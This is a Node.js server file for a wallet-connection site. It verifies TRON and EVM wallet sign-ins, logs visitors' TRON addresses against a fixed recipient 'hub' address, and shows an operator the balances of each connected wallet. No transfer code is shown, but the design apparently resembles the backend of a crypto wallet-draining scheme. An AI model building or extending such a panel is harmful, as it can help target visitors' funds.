import { createServer } from "node:http";
import { timingSafeEqual, randomBytes } from "node:crypto";
import { mkdir, readFile, rename, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createAuthState, SESSION_TTL_MS, WALLET_COOKIE, verifySignIn } from "../src/auth.mjs";
import { CONNECTION_TARGET, RECIPIENT, isValidTronAddress, signInRequestContext } from "../src/logic.mjs";
import { fetchTronWalletAssets } from "../src/tron-public.mjs";
import { fetchEvmWalletAssets, looksLikeEvmAddress, normalizeEvmChainId } from "../src/evm-public.mjs";
import { injectLandingModuleCacheBust } from "./landing-cache-bust.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const port = Number(process.env.PORT || 4173);
const storePath = path.join(root, "data", "connected-wallets.json");
const operatorId = process.env.OPERATOR_ID || "";
const operatorPassword = process.env.OPERATOR_PASSWORD || "";
const sessionCookie = "operator_session";
/** @type {Set<string>} */
const operatorSessions = new Set();
const walletAuth = createAuthState();
const ownerAuth = createAuthState();
const ownerCookie = "owner_approval";
let writeQueue = Promise.resolve();

const allowed = new Map([
  ["/index.html", "text/html; charset=utf-8"],
  ["/generated/walletconnect-client.js", "text/javascript; charset=utf-8"],
  ["/src/app.js", "text/javascript; charset=utf-8"],
  ["/src/landing.js", "text/javascript; charset=utf-8"],
  ["/src/logic.mjs", "text/javascript; charset=utf-8"],
  ["/src/styles.css", "text/css; charset=utf-8"],
  ["/src/wallet-state.mjs", "text/javascript; charset=utf-8"],
]);

const server = createServer(async (request, response) => {
  const url = new URL(request.url || "/", "http://127.0.0.1");
  try {
    if (url.pathname === "/login") {
      await handleLogin(request, response);
      return;
    }
    if (url.pathname === "/logout" && request.method === "POST") {
      await handleLogout(request, response);
      return;
    }
    if (url.pathname === "/api/wallet-connections" && request.method === "POST") {
      await handleWalletConnection(request, response);
      return;
    }
    if (url.pathname === "/api/config" && request.method === "GET") {
      handlePublicConfig(response);
      return;
    }
    if (url.pathname === "/api/owner/nonce" && request.method === "GET") {
      handleOwnerNonce(request, response);
      return;
    }
    if (url.pathname === "/api/owner/verify" && request.method === "POST") {
      await handleOwnerVerify(request, response);
      return;
    }
    if (url.pathname === "/api/owner/session" && request.method === "GET") {
      handleOwnerSession(request, response);
      return;
    }
    if (url.pathname === "/api/owner/logout" && request.method === "POST") {
      handleOwnerLogout(request, response);
      return;
    }
    if (url.pathname === "/api/auth/nonce" && request.method === "GET") {
      handleAuthNonce(request, response);
      return;
    }
    if (url.pathname === "/api/auth/verify" && request.method === "POST") {
      await handleAuthVerify(request, response);
      return;
    }
    if (url.pathname === "/api/auth/session" && request.method === "GET") {
      handleAuthSession(request, response);
      return;
    }
    if (url.pathname === "/api/auth/logout" && request.method === "POST") {
      handleAuthLogout(request, response);
      return;
    }
    if (url.pathname === "/api/wallet-assets" && request.method === "GET") {
      await handleWalletAssets(request, response);
      return;
    }
    if (url.pathname === "/api/public/wallet-assets" && request.method === "GET") {
      await handlePublicWalletAssets(request, response, url);
      return;
    }
    if (url.pathname === "/api/public/evm-wallet-assets" && request.method === "GET") {
      await handlePublicEvmWalletAssets(request, response, url);
      return;
    }
    await serveStatic(url.pathname, response);
  } catch {
    if (!response.headersSent && !response.writableEnded) {
      finish(response, 500, { "Content-Type": "text/plain; charset=utf-8", "Cache-Control": "no-store" }, "Server error");
    } else if (!response.writableEnded) {
      response.destroy();
    }
  }
});

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleLogin(request, response) {
  if (request.method === "POST") {
    const body = await readBody(request, 2048);
    const fields = new URLSearchParams(body);
    const accepted = operatorId.length > 0
      && operatorPassword.length > 0
      && sameSecret(fields.get("loginId") || "", operatorId)
      && sameSecret(fields.get("password") || "", operatorPassword);
    if (!accepted) {
      sendHtml(response, 401, loginPage("Login failed."));
      return;
    }
    const token = randomBytes(32).toString("hex");
    operatorSessions.add(token);
    finish(response, 303, {
      Location: "/login",
      "Set-Cookie": `${sessionCookie}=${token}; HttpOnly; SameSite=Lax; Path=/; Max-Age=43200`,
      "Cache-Control": "no-store",
    });
    return;
  }
  if (request.method !== "GET" && request.method !== "HEAD") {
    sendText(response, 405, "Method not allowed");
    return;
  }
  if (!hasSession(request)) {
    sendHtml(response, 200, loginPage(""));
    return;
  }
  const wallets = await readWallets();
  const enriched = await enrichWalletsWithAssets(wallets);
  sendHtml(response, 200, walletListPage(enriched));
}

/**
 * @param {Array<{ address: string, connectionTarget?: string, connectedAt: string }>} wallets
 */
async function enrichWalletsWithAssets(wallets) {
  const recent = [...wallets].slice(-50);
  const assetsByAddress = new Map();
  await Promise.all(recent.map(async (wallet) => {
    const assets = await fetchTronWalletAssets(wallet.address, { apiBase: process.env.TRON_API_BASE });
    assetsByAddress.set(wallet.address, assets);
  }));
  return wallets.map((wallet) => ({
    ...wallet,
    assets: assetsByAddress.get(wallet.address) ?? { ok: false, error: "Balance data was not loaded." },
  }));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleLogout(request, response) {
  const token = cookieValue(request, sessionCookie);
  if (token) operatorSessions.delete(token);
  finish(response, 303, {
    Location: "/login",
    "Set-Cookie": `${sessionCookie}=; HttpOnly; SameSite=Lax; Path=/; Max-Age=0`,
    "Cache-Control": "no-store",
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleWalletConnection(request, response) {
  const session = readWalletSession(request);
  if (!session) {
    sendJson(response, 401, { ok: false, error: "A verified wallet session is required." });
    return;
  }
  if (session.network !== "tron" || session.chainId !== "0x2b6653dc") {
    sendJson(response, 403, { ok: false, error: "A verified TRON mainnet wallet session is required." });
    return;
  }
  const body = await readBody(request, 2048);
  let parsed;
  try {
    parsed = JSON.parse(body);
  } catch {
    sendText(response, 400, "Bad request");
    return;
  }
  const address = parsed && typeof parsed === "object" ? parsed.address : "";
  if (typeof address !== "string" || !sameAddress(address, session.address)) {
    sendText(response, 400, "Bad request");
    return;
  }
  await rememberWallet(address, CONNECTION_TARGET);
  sendJson(response, 200, { ok: true, address, connectionTarget: CONNECTION_TARGET });
}

/**
 * @param {import("node:http").ServerResponse} response
 */
function handlePublicConfig(response) {
  sendJson(response, 200, {
    walletConnectProjectId: process.env.WALLETCONNECT_PROJECT_ID || "",
    connectionTargetTronAddress: CONNECTION_TARGET,
    tronChainId: "tron:0x2b6653dc",
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleOwnerNonce(request, response) {
  const context = requestContext(request);
  if (!context) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  const issued = ownerAuth.issueNonce();
  sendJson(response, 200, {
    ok: true,
    nonce: issued.nonce,
    expiresAt: new Date(issued.expiresAt).toISOString(),
    domain: context.domain,
    uri: context.uri,
    ownerTronAddress: RECIPIENT,
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleOwnerVerify(request, response) {
  const context = requestContext(request);
  if (!context) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  let parsed;
  try {
    parsed = JSON.parse(await readBody(request, 12_000));
  } catch {
    sendJson(response, 400, { ok: false, error: "The owner approval request is invalid." });
    return;
  }
  const message = parsed && typeof parsed === "object" ? parsed.message : "";
  const signature = parsed && typeof parsed === "object" ? parsed.signature : "";
  if (typeof message !== "string" || typeof signature !== "string") {
    sendJson(response, 400, { ok: false, error: "The owner approval request is invalid." });
    return;
  }
  const verified = await verifySignIn({
    message,
    signature,
    expectedDomain: context.domain,
    expectedUri: context.uri,
    consumeNonce: (nonce, now) => ownerAuth.consumeNonce(nonce, now),
  });
  if (!verified.ok) {
    sendJson(response, 401, verified);
    return;
  }
  if (verified.identity.network !== "tron" || verified.identity.walletId !== "walletconnect") {
    sendJson(response, 403, { ok: false, error: "A verified TRON WalletConnect session is required." });
    return;
  }
  const created = ownerAuth.createSession(verified.identity);
  finish(response, 200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "Set-Cookie": sessionCookieValue(ownerCookie, created.token, context.secure),
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify({ ok: true, session: sessionView(created.session) }));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleOwnerSession(request, response) {
  const session = readOwnerSession(request);
  sendJson(response, 200, {
    ok: true,
    approved: Boolean(session),
    session: session ? sessionView(session) : null,
    ownerTronAddress: RECIPIENT,
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleOwnerLogout(request, response) {
  ownerAuth.deleteSession(cookieValue(request, ownerCookie));
  const context = requestContext(request);
  finish(response, 200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "Set-Cookie": `${ownerCookie}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${context?.secure ? "; Secure" : ""}`,
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify({ ok: true }));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleAuthNonce(request, response) {
  const context = requestContext(request);
  if (!context) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  const issued = walletAuth.issueNonce();
  sendJson(response, 200, {
    ok: true,
    nonce: issued.nonce,
    expiresAt: new Date(issued.expiresAt).toISOString(),
    domain: context.domain,
    uri: context.uri,
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleAuthVerify(request, response) {
  const context = requestContext(request);
  if (!context) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  let parsed;
  try {
    parsed = JSON.parse(await readBody(request, 12_000));
  } catch {
    sendJson(response, 400, { ok: false, error: "The verification request is invalid." });
    return;
  }
  const message = parsed && typeof parsed === "object" ? parsed.message : "";
  const signature = parsed && typeof parsed === "object" ? parsed.signature : "";
  if (typeof message !== "string" || typeof signature !== "string") {
    sendJson(response, 400, { ok: false, error: "The verification request is invalid." });
    return;
  }
  const verified = await verifySignIn({
    message,
    signature,
    expectedDomain: context.domain,
    expectedUri: context.uri,
    consumeNonce: (nonce, now) => walletAuth.consumeNonce(nonce, now),
  });
  if (!verified.ok) {
    sendJson(response, 401, verified);
    return;
  }
  if (verified.identity.network === "tron" && verified.identity.chainId === "0x2b6653dc") {
    await rememberWallet(verified.identity.address, CONNECTION_TARGET);
  }
  const created = walletAuth.createSession(verified.identity);
  finish(response, 200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "Set-Cookie": walletCookie(created.token, context.secure),
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify({ ok: true, session: visitorSessionView(created.session) }));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleAuthSession(request, response) {
  const session = readWalletSession(request);
  if (!session) {
    sendJson(response, 200, { ok: true, session: null });
    return;
  }
  sendJson(response, 200, { ok: true, session: visitorSessionView(session) });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleAuthLogout(request, response) {
  const token = cookieValue(request, WALLET_COOKIE);
  walletAuth.deleteSession(token);
  const context = requestContext(request);
  finish(response, 200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "Set-Cookie": `${WALLET_COOKIE}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${context?.secure ? "; Secure" : ""}`,
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify({ ok: true }));
}

/**
 * @param {string} address
 * @param {Awaited<ReturnType<typeof fetchTronWalletAssets>> & { ok: true }} assets
 */
function serializeWalletAssetsResponse(address, assets) {
  return {
    ok: true,
    connectionTarget: CONNECTION_TARGET,
    address,
    assets: {
      trxSun: assets.trxSun,
      usdtUnits: assets.usdtUnits,
      trxDisplay: assets.trxDisplay,
      usdtDisplay: assets.usdtDisplay,
      tokens: assets.tokens,
    },
  };
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 * @param {URL} url
 */
async function handlePublicWalletAssets(request, response, url) {
  if (!requestContext(request)) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  const address = (url.searchParams.get("address") || "").trim();
  if (!(await isValidTronAddress(address))) {
    sendJson(response, 400, { ok: false, error: "The TRON address is invalid." });
    return;
  }
  const assets = await fetchTronWalletAssets(address, { apiBase: process.env.TRON_API_BASE });
  if (!assets.ok) {
    sendJson(response, 502, { ok: false, error: assets.error });
    return;
  }
  sendJson(response, 200, serializeWalletAssetsResponse(address, assets));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 * @param {URL} url
 */
async function handlePublicEvmWalletAssets(request, response, url) {
  if (!requestContext(request)) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  const address = (url.searchParams.get("address") || "").trim();
  const chainId = (url.searchParams.get("chainId") || "1").trim();
  if (!looksLikeEvmAddress(address)) {
    sendJson(response, 400, { ok: false, error: "The EVM address is invalid." });
    return;
  }
  if (!normalizeEvmChainId(chainId)) {
    sendJson(response, 400, { ok: false, error: "The EVM chain id is invalid." });
    return;
  }
  const assets = await fetchEvmWalletAssets(address, chainId, { rpcUrl: process.env.EVM_RPC_URL });
  if (!assets.ok) {
    sendJson(response, 502, { ok: false, error: assets.error });
    return;
  }
  sendJson(response, 200, {
    ok: true,
    network: "evm",
    chainId: assets.chainId,
    address,
    assets: {
      nativeDisplay: assets.nativeDisplay,
      nativeSymbol: assets.nativeSymbol,
      nativeUnits: assets.nativeUnits,
      tokens: assets.tokens,
    },
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleWalletAssets(request, response) {
  const session = readWalletSession(request);
  if (!session || session.network !== "tron" || session.chainId !== "0x2b6653dc") {
    sendJson(response, 403, { ok: false, error: "A verified TRON mainnet wallet session is required." });
    return;
  }
  const assets = await fetchTronWalletAssets(session.address, { apiBase: process.env.TRON_API_BASE });
  if (!assets.ok) {
    sendJson(response, 502, { ok: false, error: assets.error });
    return;
  }
  sendJson(response, 200, serializeWalletAssetsResponse(session.address, assets));
}

/**
 * @param {string} pathname
 * @param {import("node:http").ServerResponse} response
 */
async function serveStatic(pathname, response) {
  const filePath = pathname === "/" ? "/index.html" : pathname;
  const type = allowed.get(filePath);
  if (!type) {
    sendText(response, 404, "Not found");
    return;
  }
  try {
    let body = await readFile(path.join(root, filePath));
    if (filePath === "/index.html") {
      body = Buffer.from(injectLandingModuleCacheBust(body.toString("utf8")), "utf8");
    }
    finish(response, 200, {
      "Content-Type": type,
      "Cache-Control": "no-store, no-cache, must-revalidate",
      "Pragma": "no-cache",
      "Expires": "0",
      "CDN-Cache-Control": "no-store",
      "X-Content-Type-Options": "nosniff",
    }, body);
  } catch {
    sendText(response, 404, "Not found");
  }
}

/**
 * @param {string} address
 * @param {string} connectionTarget
 */
function rememberWallet(address, connectionTarget) {
  const run = writeQueue.then(() => appendWallet(address, connectionTarget));
  writeQueue = run.then(() => undefined, () => undefined);
  return run;
}

/**
 * @param {string} address
 * @param {string} connectionTarget
 */
async function appendWallet(address, connectionTarget) {
  const wallets = await readWallets();
  wallets.push({ address, connectionTarget, connectedAt: new Date().toISOString() });
  const kept = wallets.slice(-500);
  await mkdir(path.dirname(storePath), { recursive: true });
  const temporary = `${storePath}.${process.pid}.tmp`;
  await writeFile(temporary, `${JSON.stringify({ wallets: kept }, null, 2)}\n`, "utf8");
  await rename(temporary, storePath);
}

/**
 * @returns {Promise<Array<{ address: string, connectionTarget?: string, connectedAt: string }>>}
 */
async function readWallets() {
  try {
    const text = await readFile(storePath, "utf8");
    const parsed = JSON.parse(text);
    if (!parsed || typeof parsed !== "object" || !Array.isArray(parsed.wallets)) return [];
    return parsed.wallets.flatMap((/** @type {any} */ item) => {
      if (!item || typeof item !== "object") return [];
      if (typeof item.address !== "string" || typeof item.connectedAt !== "string") return [];
      const connectionTarget = typeof item.connectionTarget === "string" ? item.connectionTarget : undefined;
      return [{ address: item.address, connectionTarget, connectedAt: item.connectedAt }];
    });
  } catch (error) {
    if (error && typeof error === "object" && "code" in error && error.code === "ENOENT") return [];
    throw error;
  }
}

/**
 * @param {string} given
 * @param {string} expected
 */
function sameSecret(given, expected) {
  const left = Buffer.from(given);
  const right = Buffer.from(expected);
  if (left.length !== right.length) {
    timingSafeEqual(right, right);
    return false;
  }
  return timingSafeEqual(left, right);
}

/**
 * @param {import("node:http").IncomingMessage} request
 */
function hasSession(request) {
  const token = cookieValue(request, sessionCookie);
  return token.length > 0 && operatorSessions.has(token);
}

/**
 * @param {import("node:http").IncomingMessage} request
 */
function readWalletSession(request) {
  return walletAuth.readSession(cookieValue(request, WALLET_COOKIE));
}

/**
 * @param {import("node:http").IncomingMessage} request
 */
function readOwnerSession(request) {
  return ownerAuth.readSession(cookieValue(request, ownerCookie));
}

/**
 * @param {import("node:http").IncomingMessage} request
 */
function requestContext(request) {
  const originHeader = typeof request.headers.origin === "string" ? request.headers.origin : "";
  const host = typeof request.headers.host === "string" ? request.headers.host : "";
  const forwardedHost = typeof request.headers["x-forwarded-host"] === "string" ? request.headers["x-forwarded-host"] : "";
  const forwardedProto = typeof request.headers["x-forwarded-proto"] === "string" ? request.headers["x-forwarded-proto"] : "";
  return signInRequestContext(originHeader, host, process.env.PUBLIC_ORIGIN || "", {
    forwardedHost,
    forwardedProto,
  });
}

/**
 * @param {string} token
 * @param {boolean} secure
 */
function walletCookie(token, secure) {
  return sessionCookieValue(WALLET_COOKIE, token, secure);
}

/**
 * @param {string} name
 * @param {string} token
 * @param {boolean} secure
 */
function sessionCookieValue(name, token, secure) {
  const maxAge = Math.floor(SESSION_TTL_MS / 1000);
  return `${name}=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${maxAge}${secure ? "; Secure" : ""}`;
}

/**
 * @param {{ address: string, network: "evm" | "tron", chainId: string, walletId: string, expiresAt: number }} session
 */
function sessionView(session) {
  return {
    address: session.address,
    network: session.network,
    chainId: session.chainId,
    walletId: session.walletId,
    expiresAt: new Date(session.expiresAt).toISOString(),
  };
}

/**
 * @param {{ address: string, network: "evm" | "tron", chainId: string, walletId: string, expiresAt: number }} session
 */
function visitorSessionView(session) {
  return { ...sessionView(session), connectionTarget: CONNECTION_TARGET };
}

/**
 * @param {string} first
 * @param {string} second
 */
function sameAddress(first, second) {
  return first.startsWith("0x") && second.startsWith("0x")
    ? first.toLowerCase() === second.toLowerCase()
    : first === second;
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {string} name
 */
function cookieValue(request, name) {
  const header = request.headers.cookie;
  const raw = Array.isArray(header) ? header.join(";") : header || "";
  for (const part of raw.split(";")) {
    const separator = part.indexOf("=");
    if (separator === -1) continue;
    if (part.slice(0, separator).trim() === name) return part.slice(separator + 1).trim();
  }
  return "";
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {number} limit
 * @returns {Promise<string>}
 */
function readBody(request, limit) {
  return new Promise((resolve, reject) => {
    /** @type {Buffer[]} */
    const chunks = [];
    let size = 0;
    request.on("data", (chunk) => {
      const buffer = typeof chunk === "string" ? Buffer.from(chunk) : chunk;
      size += buffer.length;
      if (size > limit) {
        reject(new Error("body too large"));
        request.destroy();
        return;
      }
      chunks.push(buffer);
    });
    request.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    request.on("error", reject);
  });
}

/**
 * @param {string} message
 */
function loginPage(message) {
  const notice = message ? `<p id="error" role="alert">${escapeHtml(message)}</p>` : `<p id="error" role="alert"></p>`;
  return pageShell("Operator login", `<section class="card" aria-labelledby="login-title">
      <p class="eyebrow">Operator</p>
      <h1 id="login-title">Login</h1>
      <p class="lede">Sign in to see public wallet addresses that completed verified connection.</p>
      ${notice}
      <form method="post" action="/login">
        <label for="login-id">Login id</label>
        <input id="login-id" name="loginId" type="text" autocomplete="username" spellcheck="false" required>
        <label for="login-password">Password</label>
        <input id="login-password" name="password" type="password" autocomplete="current-password" required>
        <button class="primary" type="submit">Log in</button>
      </form>
    </section>`);
}

/**
 * @param {{ trxDisplay?: string, usdtDisplay?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }> }} assets
 */
function formatOperatorAssetSummary(assets) {
  const tokens = Array.isArray(assets.tokens) ? assets.tokens : [];
  if (tokens.length) {
    return tokens.map((token) => `<span>${escapeHtml(token.display || token.symbol || "0")}</span>`).join("<br>");
  }
  return `<span>${escapeHtml(assets.trxDisplay || "0 TRX")}</span><br><span>${escapeHtml(assets.usdtDisplay || "0 USDT")}</span>`;
}

/**
 * @param {Array<{ address: string, connectionTarget?: string, connectedAt: string, assets?: { ok: boolean, trxDisplay?: string, usdtDisplay?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }>, error?: string } }>} wallets
 */
function walletListPage(wallets) {
  const hub = escapeHtml(CONNECTION_TARGET);
  const rows = [...wallets].reverse().map((wallet) => {
    const target = escapeHtml(wallet.connectionTarget || CONNECTION_TARGET);
    const assets = wallet.assets && wallet.assets.ok
      ? formatOperatorAssetSummary(wallet.assets)
      : `<span class="muted">${escapeHtml(wallet.assets?.error || "Balance unavailable")}</span>`;
    return `<tr>
        <td class="address">${escapeHtml(wallet.address)}</td>
        <td class="address">${target}</td>
        <td>${assets}</td>
        <td>${escapeHtml(formatConnectedAt(wallet.connectedAt))}</td>
      </tr>`;
  }).join("");
  const body = rows
    ? `<table><thead><tr><th>Verified wallet</th><th>Linked to</th><th>Public TRON assets</th><th>Connected</th></tr></thead><tbody>${rows}</tbody></table>`
    : `<p>No wallets have connected yet.</p>`;
  return pageShell("Connected wallets", `<section class="card operator-list" aria-labelledby="wallets-title">
      <p class="eyebrow">Operator</p>
      <h1 id="wallets-title">Linked wallet view</h1>
      <p class="lede">Main hub <span class="address">${hub}</span>. Verified visitor wallets below show read-only TRX, TRC-10, and TRC-20 balances from public TRON data.</p>
      ${body}
      <form method="post" action="/logout"><button class="ghost" type="submit">Log out</button></form>
    </section>`);
}

/**
 * @param {string} title
 * @param {string} main
 */
function pageShell(title, main) {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="referrer" content="no-referrer">
  <title>${escapeHtml(title)}</title>
  <link rel="stylesheet" href="/src/styles.css">
  <style>
    .operator-list { width: min(100%, 720px); }
    table { width: 100%; border-collapse: collapse; margin-top: 12px; }
    th, td { text-align: left; padding: 10px 8px; border-bottom: 1px solid var(--line); vertical-align: top; }
    th { color: var(--muted); font-size: 0.82rem; }
    .muted { color: var(--muted); font-size: 0.88rem; }
  </style>
</head>
<body>
  <main class="screen">
    ${main}
  </main>
</body>
</html>`;
}

/**
 * @param {string} value
 */
function escapeHtml(value) {
  return value.replace(/[&<>"']/g, (character) => {
    if (character === "&") return "&amp;";
    if (character === "<") return "&lt;";
    if (character === ">") return "&gt;";
    if (character === '"') return "&quot;";
    return "&#39;";
  });
}

/**
 * @param {string} iso
 */
function formatConnectedAt(iso) {
  const date = new Date(iso);
  if (Number.isNaN(date.getTime())) return iso;
  return date.toISOString().replace("T", " ").replace(/\.\d{3}Z$/, " UTC");
}

/**
 * @param {import("node:http").ServerResponse} response
 * @param {number} status
 * @param {string} html
 */
function sendHtml(response, status, html) {
  finish(response, status, {
    "Content-Type": "text/html; charset=utf-8",
    "Cache-Control": "no-store",
    "X-Content-Type-Options": "nosniff",
  }, html);
}

/**
 * @param {import("node:http").ServerResponse} response
 * @param {number} status
 * @param {string} text
 */
function sendText(response, status, text) {
  finish(response, status, {
    "Content-Type": "text/plain; charset=utf-8",
    "Cache-Control": "no-store",
    "X-Content-Type-Options": "nosniff",
  }, text);
}

/**
 * @param {import("node:http").ServerResponse} response
 * @param {number} status
 * @param {unknown} payload
 */
function sendJson(response, status, payload) {
  finish(response, status, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify(payload));
}

/**
 * Send a fully framed response. Explicit lengths and connection closure avoid
 * chunked responses that some embedded browser panels drop.
 * @param {import("node:http").ServerResponse} response
 * @param {number} status
 * @param {import("node:http").OutgoingHttpHeaders} headers
 * @param {string | Buffer} [body]
 */
function finish(response, status, headers, body = "") {
  const payload = Buffer.isBuffer(body) ? body : Buffer.from(body);
  response.writeHead(status, {
    ...headers,
    "Content-Length": String(payload.byteLength),
    Connection: "close",
  });
  response.end(payload);
}

server.listen(port, "127.0.0.1", () => {
  const address = server.address();
  const actualPort = address && typeof address === "object" ? address.port : port;
  console.log(`Local preview: http://127.0.0.1:${actualPort}`);
  console.log("Do not generate the production QR from this local URL.");
});
